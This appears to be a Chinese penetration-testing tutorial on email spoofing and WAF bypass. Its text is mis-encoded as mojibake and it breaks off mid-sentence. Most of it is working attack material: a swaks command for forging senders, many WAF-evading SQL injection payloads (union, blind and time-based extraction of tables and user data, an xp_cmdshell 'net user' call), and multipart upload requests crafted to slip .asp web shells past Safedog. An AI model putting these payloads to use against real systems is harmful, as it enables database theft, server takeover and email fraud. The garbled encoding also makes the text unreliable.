ä½†å‡¡æ˜¯å¼€å¯äº†spfå®‰å…¨è®¤è¯çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œæ˜¯ä¸å…è®¸å‘é€åŒ¿åé‚®ä»¶çš„ï¼Œä»€ä¹ˆå«åšåŒ¿åé‚®ä»¶å‘¢ï¼Ÿ 3-8-2 ä¼ªé€ é‚®ä»¶## æœ€ç®€å•çš„åŠæ³•å°±æ˜¯ä½¿ç”¨swaksä¹‹ç±»çš„é‚®ä»¶ä¼ªé€ å·¥å…·,kaliä¸­è‡ªå¸¦ swaks â€“to xxxx@qq.com â€“from info@XXX.com â€“ehlo XXX.com â€“body hello â€“header â€œSubject: helloâ€ â€“to æ”¶ä»¶äººé‚®ç®± â€“from è¦æ˜¾ç¤ºçš„å‘ä»¶äººé‚®ç®± â€“ehlo ä¼ªé€ çš„é‚®ä»¶ehloå¤´ â€“body é‚®ä»¶æ­£æ–‡ â€“header é‚®ä»¶å¤´ä¿¡æ¯ï¼Œsubjectä¸ºé‚®ä»¶æ ‡é¢˜ é…ç½®äº†SPFçš„æƒ…å†µ è¿™ç§æƒ…å†µå°±éœ€è¦ç”¨ä¸€äº›æƒå¨çš„é‚®ä»¶æœåŠ¡å•†å»å‘é€é‚®ä»¶äº† å¦‚sendgridï¼Œmailgunï¼Œè¿™äº›æƒå¨é‚®ä»¶æœåŠ¡å•†ï¼Œä¼šè¢«å¤§éƒ¨åˆ†é‚®ä»¶æœåŠ¡å•†åŠ åˆ°ç™½åå•ä¸­ï¼Œè¿™æ ·ä»–ä»¬çš„é‚®ä»¶å°±ä¸ä¼šè¿›åˆ°åƒåœ¾ç®±ã€‚ä¹Ÿå°±æ˜¯å„å¤§æƒå¨é‚®ä»¶æœåŠ¡å•†éƒ½æ˜¯äº’ç›¸æœ‰ä¸ªç™½åå•å¤„ç†çš„ï¼Œé€šè¿‡ä»–ä»¬å¯ä»¥ä¼ªé€ å‘é€åŒ¿åé‚®ä»¶ï¼Œæœ‰æ—¶å€™æ˜¯èƒ½å¤ŸæˆåŠŸçš„ã€‚ 3-9 webæ¼æ´ 3-10 ç³»ç»Ÿæ¼æ´æ–¹æ³•ï¼š 1.æ¼æ‰«ï¼Œawvsï¼ŒIBM appscanç­‰ã€‚æœ€å¿«çš„æ–¹æ³•å°±æ˜¯é€šè¿‡å·¥å…·æ¥æ¢æµ‹ï¼Œä¸€èˆ¬å¤§ä¸€ç‚¹çš„å·¥å…·éƒ½æ˜¯æ”¶è´¹çš„ï¼Œä¸è¿‡æœ‰ç ´è§£çš„ï¼Œåƒç³»ç»Ÿæ¼æ´ï¼Œå·¥å…·ä¸­é›†æˆäº†å‡ ä¸‡ä¸ªæ¼æ´ï¼Œæ‰«èµ·æ¥å¾ˆå¿«ã€å¹¶ä¸”ç›´æ¥å¯ä»¥æˆå›¾æˆæŠ¥å‘Š 2.ç»“åˆæ¼æ´å»ç™¾åº¦ã€seebugã€exploit-db(æ¼æ´åº“ï¼Œé‡Œé¢å«æœ‰å¥½å¤šä¹‹å‰å‡ºç°è¿‡çš„æ¼æ´)ç­‰ä½ç½®æ‰¾åˆ©ç”¨ï¼Œå›å¤´ä¼šç»™å¤§å®¶è®²æ¼æ´åº“çš„ä½¿ç”¨ã€‚ 3.åœ¨ç½‘ä¸Šå¯»æ‰¾éªŒè¯poc(pocï¼šæ¼æ´åˆ©ç”¨å·¥å…·å’Œä»£ç è„šæœ¬ç­‰ç­‰ï¼Œç›´æ¥è¿›è¡Œæ”»å‡»)ã€‚ å†…å®¹ï¼š ç³»ç»Ÿæ¼æ´ï¼š## ç³»ç»Ÿæ²¡æœ‰åŠæ—¶æ‰“è¡¥ä¸ Webseveræ¼æ´ï¼š## Webseveré…ç½®é—®é¢˜ Webåº”ç”¨æ¼æ´ï¼š## Webåº”ç”¨å¼€å‘é—®é¢˜ å…¶å®ƒç«¯å£æœåŠ¡æ¼æ´ï¼š## å„ç§218080(st2)7001223389ï¼Œå‰é¢æˆ‘ä»¬é€šè¿‡nmapæ‰«æè¿‡äº† é€šä¿¡å®‰å…¨ï¼š## æ˜æ–‡ä¼ è¾“ï¼Œtokenåœ¨cookieä¸­ä¼ é€ç­‰ã€‚ 3-11 waf æœ‰å“ªäº›åŠŸèƒ½## ç½‘é©¬æœ¨é©¬ä¸»åŠ¨é˜²å¾¡åŠæŸ¥æ€ ### æµé‡ç›‘æ§ # ç½‘ç«™æ¼æ´é˜²å¾¡åŠŸèƒ½ ## å±é™©ç»„ä»¶é˜²æŠ¤åŠŸèƒ½ ## .Netå®‰å…¨ä¿æŠ¤æ¨¡å— ## åŒå±‚é˜²ç›—é“¾é“¾æ¥æ¨¡å¼ ## ç½‘ç«™ç‰¹å®šèµ„æºé˜²ä¸‹è½½ ## CCæ”»å‡»é˜²æŠ¤ ## ç½‘ç«™æµé‡ä¿æŠ¤ ## IPé»‘ç™½åå• 3-12 wafæ³¨å…¥ç»•è¿‡æ£€æµ‹æ–¹æ³• 3-12-1 WAFèº«ä»½è®¤è¯é˜¶æ®µçš„ç»•è¿‡## ä¼ªé€ æœç´¢å¼•æ“ â€”â€”â€”â€”â€”â€”â€” è¿™ç§æ–¹å¼ç°åœ¨å·²ç»ä¸è¡Œäº†æ˜‚ï¼Œæ‰€ä»¥çœ‹çœ‹å³å¯ è€ç‰ˆæœ¬çš„WAFæ˜¯æœ‰è¿™ä¸ªæ¼æ´çš„ï¼Œå°±æ˜¯æŠŠUser-Agentä¿®æ”¹ä¸ºæœç´¢å¼•æ“ï¼Œä¾¿å¯ä»¥ç»•è¿‡ï¼Œè¿›è¡Œsqlæ³¨å…¥ç­‰æ”»å‡»,è¿™é‡Œæ¨èä¸€ä¸ªç«ç‹æ’ä»¶ï¼Œæˆ‘ç»™å¤§å®¶çš„é‚£ä¸ªç«ç‹æµè§ˆå™¨å°±æœ‰æ˜‚ï¼Œå¯ä»¥ä¿®æ”¹User-Agentï¼Œå«User-Agent Switcher ä¸‹è½½åœ°å€: https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher/å®‰è£…å®Œåé‡å¯Firefoxæµè§ˆå™¨, æ‰“å¼€User Agent Switcherè®¾ç½®é¢æ¿ å½“ç„¶å–œæ¬¢ç”¨burpçš„æœ‹å‹ä¹Ÿå¯ä»¥é€šburpæ¥ä¿®æ”¹User-Agent å¦‚æœæƒ³æ‰¹é‡æ›¿æ¢User_Agentï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ ## ä¼ªé€ ç™½åå•ç‰¹æ®Šç›®å½• â€”â€”â€”â€”â€”â€”â€“ å±äºwafç®¡ç†å‘˜é…ç½®è§„åˆ™ä¸å½“å¯¼è‡´çš„ã€‚ 360webscanè„šæœ¬å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºadmin dede installç­‰ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸åšæ‹¦æˆªï¼Œä¹Ÿå°± æ˜¯ç™½åå•è®¾ç½®çš„æœ‰é—®é¢˜ï¼Œå‘ç°æ˜¯ admin å¼€å¤´çš„è·¯å¾„è¯·æ±‚å°±ç›´æ¥æ”¾è¡Œäº†ã€‚ ## ç›´æ¥æ”»å‡»æºç«™(çœŸå®ipåœ°å€) è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨äºå®‰å…¨å®ã€åŠ é€Ÿä¹ç­‰äº‘WAFï¼Œäº‘WAFçš„åŸç†é€šè¿‡DNSè§£æåˆ°äº‘WAFï¼Œè®¿é—®ç½‘ç«™çš„æµé‡è¦,ç»è¿‡æŒ‡å®šçš„DNSæœåŠ¡å™¨è§£æï¼Œç„¶åè¿›å…¥WAFèŠ‚ç‚¹è¿›è¡Œè¿‡æ»¤ï¼Œæœ€åè®¿é—®åŸå§‹æœåŠ¡å™¨ï¼Œå¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡ä¸€äº›æ‰‹æ®µï¼ˆæ¯”å¦‚cæ®µã€ç¤¾å·¥ï¼‰æ‰¾åˆ°åŸå§‹çš„æœåŠ¡å™¨åœ°å€ï¼Œä¾¿å¯ä»¥ç»•è¿‡ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¤ªå¥½çš„ä¾‹å­ï¼Œå°±ä¸å¤šåšè¯´æ˜äº†ã€‚ 3-12-2 WAFæ•°æ®åŒ…è§£æé˜¶æ®µçš„ç»•è¿‡2-1 ç¼–ç ç»•è¿‡## æœ€å¸¸è§çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå¯ä»¥è¿›è¡Œurlencodeï¼Œè¿™æ˜¯æ—©æœŸçš„æ–¹æ³•ï¼Œç°åœ¨æ•ˆæœä¸æ˜¯å¤ªå¥½ 2-2 ä¿®æ”¹è¯·æ±‚æ–¹å¼å’Œè¯·æ±‚æ•°æ®ä½ç½®ç»•è¿‡æˆ‘æƒ³ç©æ¸—é€çš„éƒ½çŸ¥é“cookieä¸­è½¬æ³¨å…¥ï¼Œæœ€å…¸å‹çš„ä¿®æ”¹è¯·æ±‚æ–¹å¼ç»•è¿‡ï¼Œå¾ˆå¤šçš„aspï¼Œaspxç½‘ç«™éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œæœ‰æ—¶å€™WAFå¯¹GETè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯Cookieç”šè‡³POSTå‚æ•°å´æ²¡æœ‰æ£€æµ‹ã€‚ 2-3 å¤å‚æ•°ç»•è¿‡## å¤å‚æ•°ç»•è¿‡ #3 ä¾‹å¦‚ä¸€ä¸ªè¯·æ±‚æ˜¯è¿™æ ·çš„ GET pennews.php?id1 union select user,password from mysql.user ## å¯ä»¥ä¿®æ”¹ä¸º GET pennews.php?id1idunionidselectiduser,passwordidfrom%20mysql.user ## å¾ˆå¤šWAFéƒ½å¯ä»¥è¿™æ ·ç»•ï¼Œæµ‹è¯•æœ€æ–°ç‰ˆWAFèƒ½ç»•è¿‡éƒ¨åˆ†è¯­å¥ã€‚ 3-12-3 WAFè§¦å‘è§„åˆ™çš„ç»•è¿‡3-1 ç‰¹æ®Šå­—ç¬¦æ›¿æ¢ç©ºæ ¼## ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç©ºæ ¼ï¼Œæ¯”å¦‚åœ¨mysqlä¸­%0aæ˜¯æ¢è¡Œï¼Œå¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥éƒ¨åˆ†ç»•è¿‡æœ€æ–°ç‰ˆæœ¬çš„WAFï¼Œåœ¨sqlserverå’Œmysqlä¸­éƒ½å¯ä»¥ç”¨ä»£æ›¿ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5 http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2 %23 æ˜¯#çš„urlç¼–ç å½¢å¼ 3-2 ç‰¹æ®Šå­—ç¬¦æ‹¼æ¥## æŠŠç‰¹æ®Šå­—ç¬¦æ‹¼æ¥èµ·æ¥ç»•è¿‡WAFçš„æ£€æµ‹ï¼Œé€šè¿‡+æ‹¼æ¥ï¼Œæ¯”å¦‚åœ¨Mysqlä¸­ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Šæ¥ç»•è¿‡ï¼Œåœ¨mssqlä¸­ï¼Œå‡½æ•°é‡Œé¢å¯ä»¥ç”¨+æ¥æ‹¼æ¥ å¦‚ï¼š GET pennews.php?id1;exec(master..xp_cmdshell â€˜net userâ€™) å¯ä»¥æ”¹ä¸ºï¼š GET pennews.php?id1; exec(â€˜masteâ€™+â€™r..xpâ€™+â€™_cmdshellâ€™+â€™â€net userâ€â€˜) 3-3 æ³¨é‡ŠåŒ…å«å…³é”®å­—## åœ¨mysqlä¸­ï¼Œå¯ä»¥åˆ©ç”¨!åŒ…å«å…³é”®è¯è¿›è¡Œç»•è¿‡ï¼Œåœ¨mysqlä¸­è¿™ä¸ªä¸æ˜¯æ³¨é‡Šï¼Œè€Œæ˜¯å–æ¶ˆæ³¨é‡Šçš„å†…å®¹ã€‚æµ‹è¯•æœ€æ–°ç‰ˆæœ¬çš„WAFå¯ä»¥å®Œç¾ç»•è¿‡ã€‚ å¦‚: GET pennews.php?id1 union select user,password from mysql.user å¯ä»¥æ”¹ä¸º: GET pennews.php?id1 !union* *!select user,password !frommysql.user 3-4 ç©ºæ ¼æ›¿æ¢æ³•## æŠŠç©ºæ ¼æ›¿æ¢æˆ%0aå¯ä»¥ç»•è¿‡æœ€æ–°ç‰ˆæœ¬WAF, åœ¨Pangolinä¸­ ç‚¹å‡» ç¼–è¾‘â€“ é…ç½®â€“ é«˜çº§â€“ é€‰æ‹©æ›¿æ¢ç©ºæ ¼ä½¿ç”¨â€“ å¡«ä¸Š%0aå³å¯ http://192.168.0.142:8080/sql.php?id=1%20union%23%0aselect%23%0a1,user(),3,4,5 3-5 ä½¿ç”¨å¤§å°å†™http://www.***.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4â€¦. 3-6 åŒå†™ï¼ˆä¸å¥½ç”¨ï¼‰http://www.***.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4â€¦. ## æ­¤æ–¹æ³•é€‚ç”¨äºä¸€äº›ä¼šæŠŠunion selectæ›¿æ¢æ‰çš„WAFï¼Œç»è¿‡WAFè¿‡æ»¤åå°±ä¼šå˜æˆ union select 1,2,3,4â€¦. 3-7 ç¼–ç ä¸æ³¨é‡Šç»“åˆ## ç»æµ‹è¯•éƒ¨åˆ†è¯­å¥å¯ä»¥è¿‡æœ€æ–°çš„waf http://www.***.com/index.php?page_id=-15 %55nION%53ElecT 1,2,3,4â€¦ http://192.168.0.142:8080/sql.php?id=1/!50000*union*!50000select!500001,user(),3,4,5 ## ä¹Ÿå¯ä»¥è¿™æ · http://192.11.22.55/sqli/Less-1/?id=1â€˜ and !11 %23 (WAFä¸æ‹¦æˆª) Uæ›¿æ¢ä¸º%55ï¼ŒSæ›¿æ¢ä¸º%53 åœ¨ union å’Œ select ä¹‹é—´æ·»åŠ æ³¨é‡Š æ‰‹å·¥è¿›è¡ŒåŠ æ³¨é‡Šè¿›è¡Œæ³¨å…¥å¤ªæ…¢ï¼Œä¸€èˆ¬æˆ‘ä»¬é€šè¿‡Sqlmapè¿™ç±»å·¥å…·æ¥å®ç°è‡ªåŠ¨æ³¨å…¥: sqlmap.py -u â€œURLâ€ â€“tamperâ€versionedmorekeywords.pyâ€ â€“dealy1 3-8 åˆ©ç”¨WAFæœ¬èº«çš„åŠŸèƒ½ç»•è¿‡(ä¸å¥½ç”¨)## å‡å¦‚ä½ å‘ç°WAFä¼šæŠŠâ€â€œæ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§æ¥è¿›è¡Œç»•è¿‡ http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4â€¦. ## å…¶å®ƒæ–¹æ³•-15+(uNioN)+(sElECt)â€¦.-15+(uNioN+SeleCT)+â€¦-15+(UnI)(oN)+(SeL)(ecT)+â€¦.-15+union (select 1,2,3,4â€¦) 3-9 ä½¿ç”¨å…¶ä»–å˜é‡æˆ–è€…å‘½ä»¤å¯¹æ³¨å…¥è¯­å¥è¿›è¡Œæ›¿æ¢(âˆš)COMMAND | WHAT TO USE INSTEAD @@version | version() concat() | concat_ws() group_concat() | concat_ws() | like ä¸Šé¢è¿™ä¸ªæ–¹æ³•å°±æ˜¯å°†11æ”¹å†™ä¸ºäº† 87 å–ä½™ï¼Œç„¶åinæ˜¯æŸ¥çœ‹æ˜¯å¦åœ¨åˆ—è¡¨ä¸­ï¼Œæ•ˆæœå’Œ11æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯èƒ½è¿‡wafã€‚ 3-10 ç»„åˆç»•è¿‡wafhttp://192.168.222.128/test/sql.php?id=1 !union*%!aa!select 1,2,3 ## å…ˆåˆ¤æ–­æ³¨å…¥ç‚¹ï¼ŒæŠŠandä¸ºï¼Œurlencodeåä¸º%26%26 http://192.168.0.102:8080/sql.php?id=1%20%26%26%20-1=-2 ä¸‹é¢æˆ‘ä»¬å…·ä½“è®²è§£ç»•è¿‡æ–¹æ³•ï¼š 1.åˆ©ç”¨()ä»£æ›¿ç©ºæ ¼ 2.åˆ©ç”¨mysqlç‰¹æ€§ ! æ‰§è¡Œè¯­å¥ 3.åˆ©ç”¨æ³¨é‡Šç¬¦å·æ··æ·†ä»£ç  æˆ‘ç»™å‡ºçš„æ³¨å…¥è¯­å¥æ˜¯ï¼š union%00**!50010select(database()),(user())%23id1|%23â€“%23|unioN|%23â€“%23|sElect|%23â€“%23|1,user(),(database()),4,5 http://192.168.0.102:8080/sql.php?id=1 union%00**!50010select1,user(),version(),4,5 è¿™é‡Œè¦æ³¨æ„çš„å‡ ç‚¹æ˜¯ 1.mysqlå…³é”®å­—ä¸­æ˜¯ä¸èƒ½æ’å…¥çš„ï¼Œå³selectæ˜¯ä¼šæŠ¥é”™çš„ï¼Œä½†æ˜¯å‡½æ•°åå’Œæ‹¬å·ä¹‹é—´æ˜¯å¯ä»¥åŠ ä¸Šçš„,åƒdatabase()è¿™æ ·çš„ä»£ç æ˜¯å¯ä»¥æ‰§è¡Œçš„ 2.!ä¸­é—´çš„ä»£ç æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œå…¶ä¸­50010ä¸ºmysqlç‰ˆæœ¬å·ï¼Œåªè¦mysqlå¤§äºè¿™ä¸ªç‰ˆæœ¬å°±ä¼šæ‰§è¡Œé‡Œé¢çš„ä»£ç  3.æ•°æ®æˆ–è€…å‡½æ•°å‘¨å›´å¯ä»¥æ— é™åµŒå¥—() 4.åˆ©ç”¨å¥½%00 user()) 3-11 å®Œæ•´è¿‡ç‹—æ³¨å…¥è¯­å¥## åˆ¤æ–­ï¼š 1â€™%26%261%3d2%23 ## åˆ¤æ–­åˆ—æ•°ï¼š 1â€™ order by 2%23 ## å…³è”æŸ¥è¯¢çˆ†å‡ºç”¨æˆ·å’Œæ•°æ®åº“ï¼š 1%27%20union%00**!50010select(database()),(user())%23 ## å…³è”æŸ¥è¯¢çˆ†å‡ºæ•°æ®è¡¨ï¼š %27%20union%00!50010select((group_concat(table_name))),nullfrom((information_schema.TABLES))whereTABLE_SCHEMA%3d(database())%23 ## å…³è”æŸ¥è¯¢çˆ†å‡ºå­—æ®µå€¼ï¼š %27%20union%00**!50010select((group_concat(COLUMN_NAME))),nullfrom((information_schema.columns))whereTABLE_NAME%3d%27users%27%23 ## å…³è”æŸ¥è¯¢æå–æ•°æ®ï¼š %27%20union%00!50010select((group_concat(first_name))),nullfrom((users))%23 ## ç›²æ³¨çˆ†å‡ºæ•°æ®åº“ï¼š 1â€™ and substr(database(),1,1)%3dâ€™1â€™%23 ## ç›²æ³¨çˆ†å‡ºæ•°æ®è¡¨ï¼š 1â€™%00*and substr((*!50010select((group_concat(table_name)))from((information_schema.TABLES))whereTABLE_SCHEMA%3d(database())),1,1)%3dâ€™1â€™%23 ## ç›²æ³¨çˆ†å‡ºå­—æ®µå€¼ï¼š 1â€™%00*and substr((*!50010select((group_concat(COLUMN_NAME)))from((information_schema.columns))whereTABLE_NAME%3d%27users%27),1,1)%3dâ€™1â€™%23 ## ç›²æ³¨æå–æ•°æ®ï¼š 1â€™%00and substr((!50010select((group_concat(first_name)))from((users))),1,1)%3dâ€™1â€™%23\\ ## åŸºäºæ—¶é—´çš„ç›²æ³¨çˆ†å‡ºæ•°æ®åº“ï¼š 1â€™%00and (select case when (substr(database(),1,1) like â€˜dâ€™) then sleep(3) else 0 end)%23 ## åŸºäºæ—¶é—´çš„ç›²æ³¨çˆ†å‡ºæ•°æ®è¡¨ï¼š 1â€™%00and (select case when (substr((!50010select((group_concat(table_name)))from((information_s chema.TABLES))whereTABLE_SCHEMA%3d(database())),1,1) like â€˜dâ€™) then sleep(3) else 0 end)%23 ## åŸºäºæ—¶é—´çš„ç›²æ³¨çˆ†å‡ºå­—æ®µå€¼ï¼š 1â€™%00and (select case when (substr((!50010select((group_concat(COLUMN_NAME)))from((information_schema.columns))whereTABLE_NAME%3d%27users%27),1,1) like â€˜dâ€™) then sleep(3) else 0 end)%23 ## åŸºäºæ—¶é—´çš„ç›²æ³¨æå–æ•°æ®ï¼š 1â€™%00*and (select case when (substr((*!50010select((group_concat(first_name)))from((users))),1,1) like â€˜dâ€™) then sleep(3) else 0 end)%23 3-12 httpè¯·æ±‚å¤´è®¾ç½®åˆ†å—ä¼ è¾“(âˆš)## æ·»åŠ httpå¤´ä¿¡æ¯ ## Transfer-Encoding:chunked ## ä¾é è¿ç»­ä¼ è¾“å®Œæˆæ³¨å…¥ï¼Œåˆ†åŒ…è¿‡wafï¼Œä½†æ˜¯åˆ°äº†æœåŠ¡å™¨é‚£è¾¹æ—¶ï¼Œçœ‹åˆ°æœ€åæ•°é•¿åº¦ä¸º0æ—¶æˆ–è€…çœ‹åˆ°å¥½å‡ ä¸ªå›è½¦æ¢è¡Œç¬¦ï¼Œè¡¨ç¤ºæ•°æ®ä¼ è¾“å®Œæˆã€‚è¿™ä¸ªæ‰‹æ®µè¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚è¿™ä¸ªéœ€è¦ä½ å¯¹æ•°æ®ä¼ è¾“çš„æ•°æ®åŒ…éå¸¸ç†Ÿæ‚‰æ‰ç©çš„å‡ºæ¥ã€‚ 3-13 ä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç»•è¿‡Union - !Union Select - !!Select* Database() - !database**!!()* ä½¿ç”¨è¿™ç§æ–¹æ³•SQLè¯­å¥ä¾ç„¶å¯ä»¥æ­£ç¡®æ‰§è¡Œï¼Œè€Œä¸”ä¼šå®Œç¾è¿‡ç‹—ï¼ ä½†æ˜¯è¿™é‡Œæ¯”è¾ƒå‘çš„ä¸€ç‚¹æ˜¯å®‰å…¨ç‹—3.5ç‰ˆæœ¬ä¼šæ‹¦æˆªå…³é”®å­—information_schemaï¼Œè¿™æ ·åˆ©ç”¨èµ·æ¥å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œä¸è¿‡ç§ç¥è¿˜æ˜¯æä¾›äº†ä¸€ç§æ–¹æ³•ç»•è¿‡ï¼š å½“mysqlç‰ˆæœ¬5.6æ—¶ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹è¯­å¥ä»£æ›¿ï¼š Select table_name from mysql.innodb_table_stats where database_name database(); 3-14 sqlè¯­å¥ä¸­orå’Œandæ›¿æ¢ç»•è¿‡https://blog.csdn.net/weixin_46370858/article/details/114481900 3-12-4 wafæ–‡ä»¶ä¸Šä¼ æ£€æµ‹æ–¹æ³•(âˆš)4-1 æ–‡ä»¶åå‰ç¼€åŠ [0x09]ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; nameâ€filepathâ€; filenameâ€[0x09]backlion.aspâ€ Content-Type: texthtml 4-2 æ–‡ä»¶åå»æ‰åŒå¼•å·ç»•è¿‡ï¼šâ€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; nameâ€filepathâ€; filenamebacklion.asp Content-Type: texthtml 4-3 æ·»åŠ ä¸€ä¸ªfilename1çš„æ–‡ä»¶åå‚æ•°ï¼Œå¹¶èµ‹å€¼ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; nameâ€filepathâ€; filenameâ€ backlion.aspâ€;filename1â€test.jpgâ€ Content-Type: texthtml 4-4 formå˜é‡æ”¹æˆf+ormç»„åˆç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: f+orm-data; nameâ€filepathâ€;filenameâ€backlion.aspâ€ Content-Type: texthtml 4-5 æ–‡ä»¶ååç¼€å¤§å°å†™ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; nameâ€filepathâ€; filenameâ€backlion.Aspâ€ Content-Type: texthtml 4-6 å»æ‰form-dataå˜é‡ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: nameâ€filepathâ€; filenameâ€backlion.aspâ€ Content-Type: texthtml 4-7 åœ¨Content-Disposition:åæ·»åŠ å¤šä¸ªç©ºæ ¼ æˆ–è€…åœ¨form-data;åæ·»åŠ å¤šä¸ªç©ºæ ¼ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data ; nameâ€filepathâ€; filenameâ€backlion.aspâ€ Content-Type: texthtml æˆ–è€… â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data ; nameâ€filepathâ€; filenameâ€baclion.aspâ€ Content-Type: texthtml 4-8 çªç ´7 ï¼Œbacklion.asp . (ç©ºæ ¼+.)ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; nameâ€filepathâ€; filenameâ€backlion.asp .â€ Content-Type: texthtml 4-9 çªç ´8 ï¼Œâ€œå›è½¦æ¢è¡Œï¼Œç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; nameâ€filepathâ€; filenameâ€backlion.asp â€ Content-Type: texthtml 4-10 çªç ´9 ï¼ŒNTFSæµ åœ¨æ–‡ä»¶åååŠ ::$DATAç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; nameâ€filepathâ€; filenameâ€backlion.asp::$DATAâ€ Content-Type: texthtml â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; nameâ€filepathâ€; filenameâ€ backlion.asp::$DATA\\0x00\\fuck.asp0x00.jpgâ€ Content-Type: texthtml 4-11 çªç ´10 ç»è¿‡å¯¹IIS 6.0çš„æµ‹è¯•å‘ç°ï¼Œå…¶æ€»æ˜¯é‡‡ç”¨ç¬¬ä¸€ä¸ªï¼ˆä¹Ÿå°±æ˜¯åŒæ–‡ä»¶ä¸Šä¼ ï¼‰Content-Disposition ä¸­çš„å€¼åšä¸ºæ¥æ”¶å‚æ•°ï¼Œè€Œå®‰å…¨ç‹—æ€»æ˜¯ä»¥æœ€åä¸€ä¸ªContent-Dispositionä¸­çš„å€¼åšä¸ºæ¥æ”¶å‚æ•°ã€‚å› æ­¤å°è¯•æ„é€ å¦‚ä¸‹è¯·æ±‚[ä¸Šä¼ backlion.aspæˆåŠŸ]ï¼š Content-Disposition: form-data; nameâ€FileUploadNameâ€; filenameâ€backlion.aspâ€ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“15377259221471 Content-Disposition: form-data; nameâ€FileUploadNameâ€; filenameâ€backlion.txtâ€ Content-Type: applicationoctet-stream Content-Disposition: form-data; nameâ€FileUploadNameâ€; filenameâ€backlion.aspâ€ Content-Disposition: form-data; nameâ€FileUploadNameâ€; filenameâ€backlion.aspâ€ 4-12 çªç ´11ï¼Œå°†Content-Typeå’ŒConTent-Dispositionè°ƒæ¢é¡ºåºä½ç½®ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Type: texthtml ConTent-Disposition: form-data; nameâ€filepathâ€; filenameâ€backlion.aspâ€ 4-13 çªç ´12ï¼Œåœ¨æ–‡ä»¶åå‰ç¼€åŠ ç©ºæ ¼ï¼ˆtabé”®å¯æ›¿æ¢ï¼‰ç»•è¿‡ï¼šâ€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; nameâ€filepathâ€; filename â€œbacklion.aspâ€ Content-Type: texthtml 4-14 çªç ´13ï¼Œåœ¨form-dataåŠ ç©ºæ ¼ç»•è¿‡â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; nameâ€uploadedâ€; filenameâ€backlion.aspâ€ Content-Type: texthtml 4-15 çªç ´14ï¼Œåœ¨form-dataçš„å‰ååŠ ä¸Š+ç»•è¿‡ï¼šâ€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: +form-data; nameâ€filepathâ€; filenameâ€backlion.aspâ€ Content-Type: texthtml â€”â€”WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data+; nameâ€filepathâ€; filenameâ€backlion.aspâ€ Content-Type: texthtml 3-12-5 wafå·¥å…·ç»•è¿‡5-1 æ’ä»¶æ‰©å±•Bypass WAF ä¼ªé€ è¯·æ±‚å¤´çš„ä¿¡æ¯ï¼Œé€šè¿‡wafä¹Ÿæ˜¯å¾ˆæœ‰æ•ˆçš„ï¼Œå› ä¸ºwafã€å°¤å…¶æ˜¯äº‘wafï¼Œå‘ç°è¯·æ±‚æ¥çš„ipåœ°å€æ˜¯127.0.0.1ï¼Œä»–ä¼šè§‰å¾—æ˜¯è‡ªå·±çš„ipåœ°å€æ¥çš„è¯·æ±‚ï¼Œä¸€èˆ¬ä¸ä¼šæ€ã€‚ ## ä»€ä¹ˆæ˜¯remote_addr ## remote_addr æ˜¯æœåŠ¡ç«¯æ 